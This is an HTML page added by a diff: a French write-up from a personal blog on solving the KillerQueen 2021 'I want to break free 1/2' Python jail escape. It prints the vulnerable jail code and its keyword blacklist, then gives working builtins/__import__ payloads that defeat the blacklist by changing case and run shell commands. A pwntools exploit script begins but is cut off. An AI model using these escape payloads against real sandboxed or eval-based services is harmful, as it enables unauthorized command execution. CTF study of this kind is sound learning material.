@@ -1,0 +1,1265 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-us" lang="en-us">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+
+
+
+
+
+
+
+
+
+
+    
+
+
+
+
+
+
+
+<script defer language="javascript" type="text/javascript" src="/js/bundle.min.145453261a7755f5042a854c4213501d215a8fbe34c08d181c40f803f1315e74.js"></script>
+
+
+
+
+
+
+    
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    
+    <link rel="icon" href=/images/favicon.png>
+
+    
+    
+
+
+
+
+
+  
+
+
+
+
+
+  
+  
+  
+
+
+<!-- Open Graph image and Twitter Card metadata -->
+
+<title itemprop="name">Vozec&#39;s Blog - I want to break free 1/2 | KillerQueen 2021 | Catégorie Pwn</title>
+<meta property="og:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;I&#32;want&#32;to&#32;break&#32;free&#32;1/2&#32;|&#32;KillerQueen&#32;2021&#32;|&#32;Catégorie&#32;Pwn />
+<meta name="twitter:title" content=Vozec&#39;s&#32;Blog&#32;-&#32;I&#32;want&#32;to&#32;break&#32;free&#32;1/2&#32;|&#32;KillerQueen&#32;2021&#32;|&#32;Catégorie&#32;Pwn />
+<meta itemprop="name" content=Vozec&#39;s&#32;Blog&#32;-&#32;I&#32;want&#32;to&#32;break&#32;free&#32;1/2&#32;|&#32;KillerQueen&#32;2021&#32;|&#32;Catégorie&#32;Pwn />
+<meta name="application-name" content=Vozec&#39;s&#32;Blog&#32;-&#32;I&#32;want&#32;to&#32;break&#32;free&#32;1/2&#32;|&#32;KillerQueen&#32;2021&#32;|&#32;Catégorie&#32;Pwn />
+<meta property="og:site_name" content="" />
+
+
+<meta name="description" content="Python Jail 1/2 | KillerQueen 2021" />
+<meta itemprop="description" content="Python Jail 1/2 | KillerQueen 2021" />
+<meta property="og:description" content="Python Jail 1/2 | KillerQueen 2021" />
+<meta name="twitter:description" content="Python Jail 1/2 | KillerQueen 2021" />
+
+
+<base href="//localhost:1313/writeups/python-jail-killerqueenctf-2021/" />
+<link rel="canonical" href="//localhost:1313/writeups/python-jail-killerqueenctf-2021/" itemprop="url" />
+<meta name="url" content="//localhost:1313/writeups/python-jail-killerqueenctf-2021/" />
+<meta name="twitter:url" content="//localhost:1313/writeups/python-jail-killerqueenctf-2021/" />
+<meta property="og:url" content="//localhost:1313/writeups/python-jail-killerqueenctf-2021/" />
+
+
+<meta property="og:updated_time" content="2021-11-01T12:00:00Z" />
+
+
+<link rel="sitemap" type="application/xml" title="Sitemap" href='//localhost:1313/sitemap.xml' />
+
+<meta name="robots" content="index,follow" />
+<meta name="googlebot" content="index,follow" />
+
+
+<meta name="twitter:site" content="https://twitter.com/Vozec1" />
+<meta name="twitter:creator" content="https://twitter.com/Vozec1" />
+<meta property="fb:admins" content="" />
+
+
+<meta name="apple-mobile-web-app-title" content="" />
+<meta name="apple-mobile-web-app-capable" content="yes" />
+<meta name="apple-mobile-web-app-status-bar-style" content="black" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.134.1">
+
+
+    
+    
+
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.94a339836f89f0d25f31980cb6b0631da21e20af128308747ce44e0525eb16ef.css">
+
+
+    
+    <style>
+    body {
+        --sidebar-bg-color: #202020;
+        --sidebar-img-border-color: #515151;
+        --sidebar-p-color: #909090;
+        --sidebar-h1-color: #FFF;
+        --sidebar-a-color: #FFF;
+        --sidebar-socials-color: #FFF;
+        --text-color: #222;
+        --bkg-color: #FAF9F6;
+        --post-title-color: #303030;
+        --list-color: #5A5A5A;
+        --link-color: #268BD2;
+        --date-color: #515151;
+        --table-border-color: #E5E5E5;
+        --table-stripe-color: #F9F9F9;
+        --code-color: #000;
+        --code-background-color: #E5E5E5;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+        --moon-sun-color: #FFF;
+        --moon-sun-background-color: #515151;
+    }
+    body.dark-theme {
+        --text-color: #EEE;
+        --bkg-color: #121212;
+        --post-title-color: #DBE2E9;
+        --list-color: #9D9D9D;
+        --link-color: #268BD2;
+        --date-color: #9A9A9A;
+        --table-border-color: #515151;
+        --table-stripe-color: #202020;
+        --code-color: #FFF;
+        --code-background-color: #515151;
+        --code-block-color: #FFF;
+        --code-block-background-color: #272822;
+    }
+    body {
+        background-color: var(--bkg-color);
+    }
+</style>
+
+</head>
+
+    <body class="dark-theme">
+        <div class="wrapper">
+            <aside class="sidebar">
+    <div class="container sidebar-sticky">
+        <div class="light-dark" align="right">
+    <button class="btn-light-dark" title="Toggle light/dark mode">
+        <svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M6 .278a.768.768 0 0 1 .08.858a7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277c.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316a.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71C0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+        </svg>
+        <svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M8 12a4 4 0 1 0 0-8a4 4 0 0 0 0 8zM8 0a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 0zm0 13a.5.5 0 0 1 .5.5v2a.5.5 0 0 1-1 0v-2A.5.5 0 0 1 8 13zm8-5a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2a.5.5 0 0 1 .5.5zM3 8a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1 0-1h2A.5.5 0 0 1 3 8zm10.657-5.657a.5.5 0 0 1 0 .707l-1.414 1.415a.5.5 0 1 1-.707-.708l1.414-1.414a.5.5 0 0 1 .707 0zm-9.193 9.193a.5.5 0 0 1 0 .707L3.05 13.657a.5.5 0 0 1-.707-.707l1.414-1.414a.5.5 0 0 1 .707 0zm9.193 2.121a.5.5 0 0 1-.707 0l-1.414-1.414a.5.5 0 0 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .707zM4.464 4.465a.5.5 0 0 1-.707 0L2.343 3.05a.5.5 0 1 1 .707-.707l1.414 1.414a.5.5 0 0 1 0 .708z"/>
+        </svg>
+    </button>
+</div>
+
+        <div class="sidebar-about">
+    <h1 class="brand">
+        
+            <a href="//localhost:1313/">
+                <img src="https://avatars.githubusercontent.com/u/61807609?v=4" alt="brand image">
+            </a>
+        
+        
+            <a href="//localhost:1313/">
+                <h1>Vozec&#39;s Blog</h1>
+            </a>
+        
+    </h1>
+    <p class="lead">
+    A student passionate about cybersecurity
+    </p>
+</div>
+
+        <nav>
+    <ul class="sidebar-nav">
+
+        
+        
+        
+        
+            
+
+            
+                
+                
+                    <li class="heading">
+                        <a href="/about/">About</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/writeups/">Writeups</a>
+                    </li>
+                    
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/researchs/">Researchs</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/rsa/">1/ Crypto RSA</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/aes/">2/ Crypto AES</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+        
+            
+
+            
+                
+                
+            
+                
+                
+            
+                
+                
+                    <li class="heading">
+                        <a href="/other/">3/ Crypto Other</a>
+                    </li>
+                    
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+                
+                
+            
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+            
+                
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+                        
+                
+            
+        
+
+    </ul>
+</nav>
+
+        
+    <a target="_blank" class="social" title="GitHub" href="https://github.com/Vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24">
+            <path fill="currentColor" d="M18.88 1.099C18.147.366 17.265 0 16.233 0H3.746C2.714 0 1.832.366 1.099 1.099C.366 1.832 0 2.714 0 3.746v12.487c0 1.032.366 1.914 1.099 2.647c.733.733 1.615 1.099 2.647 1.099H6.66c.19 0 .333-.007.429-.02a.504.504 0 0 0 .286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555 0 0 1-.904-.091a2.026 2.026 0 0 1-.872-.39a1.651 1.651 0 0 1-.572-.8l-.13-.3a3.25 3.25 0 0 0-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956 0 0 1-.17-.156a.723.723 0 0 1-.117-.182c-.026-.061-.004-.111.065-.15c.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1 0 0 1 .631.677c.2.355.44.626.722.813c.282.186.566.28.852.28c.286 0 .533-.022.742-.065a2.59 2.59 0 0 0 .585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907 0 0 1-1.333-.234a5.314 5.314 0 0 1-1.223-.507a3.5 3.5 0 0 1-1.047-.872c-.277-.347-.505-.802-.683-1.365c-.177-.564-.266-1.215-.266-1.952c0-1.049.342-1.942 1.027-2.68c-.32-.788-.29-1.673.091-2.652c.252-.079.625-.02 1.119.175c.494.195.856.362 1.086.5c.23.14.414.257.553.352a9.233 9.233 0 0 1 2.497-.338c.859 0 1.691.113 2.498.338l.494-.312a6.997 6.997 0 0 1 1.197-.572c.46-.174.81-.221 1.054-.143c.39.98.424 1.864.103 2.653c.685.737 1.028 1.63 1.028 2.68c0 .737-.089 1.39-.267 1.957c-.177.568-.407 1.023-.689 1.366a3.65 3.65 0 0 1-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9 0 0 1-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36 0 0 0 .208.189c.096.034.18.056.254.064c.074.01.18.013.318.013h2.914c1.032 0 1.914-.366 2.647-1.099c.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/>
+        </svg>
+    </a>
+
+
+
+    <a target="_blank" class="social" title="LinkedIn" href="https://www.linkedin.com/in/arthur-dlfr/">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 448 512">
+            <path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5c0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7c-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5c67.2 0 79.7 44.3 79.7 101.9V416z"/>
+        </svg>
+    </a>
+
+
+    <a target="_blank" class="social" title="Twitter" href="https://twitter.com/Vozec1">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16">
+            <path fill="currentColor" d="M5.032 14.286c6.037 0 9.34-4.837 9.34-9.032c0-.137 0-.274-.01-.41A6.56 6.56 0 0 0 16 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207 0 0 0 1.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322 0 0 0-1.862-.958a3.384 3.384 0 0 0-2.082.334a3.223 3.223 0 0 0-1.442 1.49a3.08 3.08 0 0 0-.208 2.03a9.57 9.57 0 0 1-3.747-.963a9.269 9.269 0 0 1-3.018-2.354a3.086 3.086 0 0 0-.36 2.314c.189.787.68 1.475 1.376 1.924a3.344 3.344 0 0 1-1.49-.398v.04c0 .734.263 1.444.743 2.01a3.3 3.3 0 0 0 1.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19 0 0 0 1.168 1.577a3.36 3.36 0 0 0 1.9.627A6.732 6.732 0 0 1 0 12.86a9.527 9.527 0 0 0 5.032 1.423"/>
+        </svg>
+    </a>
+
+
+
+
+    <a target="_blank" class="social" title="Discord" href="vozec">
+        <svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24">
+            <path fill="currentColor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09 0 0 0-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09 0 0 0-4.8 0c-.14-.34-.35-.76-.54-1.09c-.01-.02-.04-.03-.07-.03c-1.5.26-2.93.71-4.27 1.33c-.01 0-.02.01-.03.02c-2.72 4.07-3.47 8.03-3.1 11.95c0 .02.01.04.03.05c1.8 1.32 3.53 2.12 5.24 2.65c.03.01.06 0 .07-.02c.4-.55.76-1.13 1.07-1.74c.02-.04 0-.08-.04-.09c-.57-.22-1.11-.48-1.64-.78c-.04-.02-.04-.08-.01-.11c.11-.08.22-.17.33-.25c.02-.02.05-.02.07-.01c3.44 1.57 7.15 1.57 10.55 0c.02-.01.05-.01.07.01c.11.09.22.17.33.26c.04.03.04.09-.01.11c-.52.31-1.07.56-1.64.78c-.04.01-.05.06-.04.09c.32.61.68 1.19 1.07 1.74c.03.01.06.02.09.01c1.72-.53 3.45-1.33 5.25-2.65c.02-.01.03-.03.03-.05c.44-4.53-.73-8.46-3.1-11.95c-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.84 2.12-1.89 2.12zm6.97 0c-1.03 0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06 0 1.9.96 1.89 2.12c0 1.17-.83 2.12-1.89 2.12z"/>
+        </svg>
+    </a>
+
+
+
+
+
+
+
+
+
+
+    <a target="_blank" class="social" title="Email" href="https://www.root-me.org/Vozec">
+       <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 485.211 485.211">
+            <path fill="currentColor" d="M301.393,241.631L464.866,424.56H20.332l163.474-182.928l58.801,51.443L301.393,241.631z M462.174,60.651H23.027 l219.579,192.142L462.174,60.651z M324.225,221.67l160.986,180.151V80.792L324.225,221.67z M0,80.792v321.029L160.972,221.64 L0,80.792z"/>
+       </svg>
+    </a>
+
+
+        <p class="footnote">
+powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a target="_blank" href="https://github.com/lukeorth/poison">poison</a>
+    <br>
+    &copy; 2024 . All rights reserved.
+</p>
+
+  </div>
+</aside>
+
+            <main class="content container">
+                <div class="post">
+  <div class="info">
+  <h1 class="post-title">
+    <a href="//localhost:1313/writeups/python-jail-killerqueenctf-2021/">I want to break free 1/2 | KillerQueen 2021 | Catégorie Pwn</a>
+  </h1>
+
+  <div class="headline">
+    <div>
+      
+      <time datetime=" 2021-11-01T12:00:00Z" class="post-date">
+        November 1, 2021
+      </time>
+      
+      <span> - </span>
+      <span class="reading-time">
+        
+          
+        
+
+        <span>3 mins read</span>
+      </span>
+    </div>
+
+    
+    <ul class="tags">
+      
+      <li class="tag-pwn">
+        <a href="//localhost:1313/tags/pwn">pwn</a>
+      </li>
+      
+      <li class="tag-tuto">
+        <a href="//localhost:1313/tags/tuto">tuto</a>
+      </li>
+      
+      <li class="tag-writeup">
+        <a href="//localhost:1313/tags/writeup">writeup</a>
+      </li>
+      
+    </ul>
+    
+  </div>
+
+  
+  
+
+  
+</div>
+
+  <h1 id="i-want-to-break-free-12--killerqueen-2021">I want to break free 1/2 | KillerQueen 2021</h1>
+<h2 id="fichiers">Fichier(s)</h2>
+<ul>
+<li><a href="./files/jail.py">Jail</a></li>
+<li><a href="./files/blacklist.txt">blacklist.txt</a></li>
+</ul>
+<h2 id="necessaires">Necessaires</h2>
+<ul>
+<li>Netcat</li>
+<li>Python3</li>
+</ul>
+<h2 id="flag">Flag</h2>
+<pre tabindex="0"><code>kqctf{0h_h0w_1_w4n7_70_br34k_fr33_2398d89vj3nsoicifh3bdoq1b39049v}
+</code></pre><h2 id="solution-détaillée">Solution détaillée</h2>
+<p>Le but du challenge est d&rsquo;escape la jail python pour afficher le contenu d&rsquo;un Fichier txt et d&rsquo;avoir le flag.</p>
+<h4 id="analyse-de-jailpy">Analyse de Jail.py</h4>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Python" data-lang="Python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">server</span>():
+</span></span><span style="display:flex;"><span>    message <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    You are in jail. Can you escape?
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>    print(message)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>            data <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+</span></span><span style="display:flex;"><span>            safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> char <span style="color:#f92672">in</span> data:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> (ord(char)<span style="color:#f92672">&gt;=</span><span style="color:#ae81ff">33</span> <span style="color:#f92672">and</span> ord(char)<span style="color:#f92672">&lt;=</span><span style="color:#ae81ff">126</span>):
+</span></span><span style="display:flex;"><span>                    safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;blacklist.txt&#34;</span>,<span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>                badwords <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>readlines()
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> badword <span style="color:#f92672">in</span> badwords:
+</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> badword <span style="color:#f92672">in</span> data <span style="color:#f92672">or</span> data <span style="color:#f92672">in</span> badword:
+</span></span><span style="display:flex;"><span>                    safe <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> safe:
+</span></span><span style="display:flex;"><span>                print(exec(data))
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;You used a bad word!&#34;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">&#34;Something went wrong.&#34;</span>)
+</span></span><span style="display:flex;"><span>            print(e)
+</span></span><span style="display:flex;"><span>            exit()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    server()
+</span></span></code></pre></div><p>On a une boucle infinie qui récupère notre input et l&rsquo;exécute dans un <code>eval(input)</code> sous certaines conditions .
+En effet il exécute la commande python si <code>safe</code> prend la valeur <strong>True</strong>
+Celle ci est définie sur <em>True</em> de base et passe sur <em>False</em> si elle détecte un mauvais charactère.</p>
+<p>On a 2 filtres :</p>
+<ul>
+<li>Le premier sur les charactères</li>
+<li>Le second sur les mots utilisés</li>
+</ul>
+<p>Notre commande ne dois pas contenir de lettre aillant pour un ordre dans la table ascii inférieur a 33 et supérieur a 126 :
+Ainsi les espaces , les backslashs , et autres charactères spéciaux sont interdit ?
+Enfin , on ne peut pas utiliser ces mots :</p>
+<pre tabindex="0"><code>cat grep nano import eval subprocess input sys execfile open exec for dir file input write while echo print int os read
+</code></pre><h4 id="proof-of-concept-poc">Proof Of Concept (POC)</h4>
+<p>Avant d&rsquo;exécuter nos commandes, nous devons faire notre POC , c&rsquo;est à dire réussir à exécuter une commande simple sur la machine distante .
+Pour ce faire, affichons les modules disponibles depuis la jail :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>print(__builtins__<span style="color:#f92672">.</span>__dict__)
+</span></span></code></pre></div><p>Le souci est que <code>print</code> est blacklisté !
+Ne sachant pas les modules utilisés, j&rsquo;ai exécuté sur ma machine la commande pour voir quel module il pourrait y avoir à exploiter :
+La chose importante qui en est ressortie et :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;__import__&#39;</span>: <span style="color:#f92672">&lt;</span>built<span style="color:#f92672">-</span><span style="color:#f92672">in</span> function __import__<span style="color:#f92672">&gt;</span>
+</span></span></code></pre></div><p>Supposons que notre cible ait aussi <em>import</em></p>
+<p>Comme dans une <a href="https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/" target="_blank">SSTI</a> (Server Side Template Injection) , le but est d&rsquo;importer le module <code>\'os\'</code></p>
+<p>On trouve facilement ce payload sur internet :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__builtins__<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;__import__&#39;</span><span style="color:#f92672">.</span>lower()](<span style="color:#e6db74">&#39;os&#39;</span>)<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;system&#39;</span>](<span style="color:#e6db74">&#39;id&#39;</span>)
+</span></span></code></pre></div><p>Malheureusement, on ne peut pas utiliser :</p>
+<ul>
+<li>&lsquo;os&rsquo;</li>
+<li>&lsquo;import&rsquo;</li>
+<li>sys de &lsquo;system&rsquo;</li>
+</ul>
+<p>On peut bypass <strong>import</strong> en le remplaçant par <strong>IMPORT</strong> et a l&rsquo;inverse , on remplace <strong>&lsquo;os&rsquo;</strong> par <strong>&lsquo;OS&rsquo;.lower()</strong> et <strong>&lsquo;system&rsquo;</strong> par <strong>&lsquo;SYSTEM&rsquo;.lower()</strong></p>
+<p>On a donc notre payload final :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>__builtins__<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;__IMPORT__&#39;</span><span style="color:#f92672">.</span>lower()](<span style="color:#e6db74">&#39;OS&#39;</span><span style="color:#f92672">.</span>lower())<span style="color:#f92672">.</span>__dict__[<span style="color:#e6db74">&#39;SYSTEM&#39;</span><span style="color:#f92672">.</span>lower()](<span style="color:#e6db74">&#39;id&#39;</span>)
+</span></span></code></pre></div><p><img src="./img/id.png" alt="Alt text"></p>
+<p>Maintenant, nous sommes confrontés à un nouveau problème, on ne peut pas faire d’espace.
+On peut contourner le filtre de 2 manières, soit en convertissant en octal la commande, soit en remplaçant chaque lettre par son correspondant <code>chr()</code> de la table ascii</p>
+<p>Exemple :
+<img src="./img/bypass.png" alt="Alt text"></p>
+<h4 id="exploit">Exploit</h4>
+<p>Grâce a cette technique on peut écrire un script pour avoir notre RCE :
+J&rsquo;utilise pwntools pour faciliter la gestion du socket TCP (netcat)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
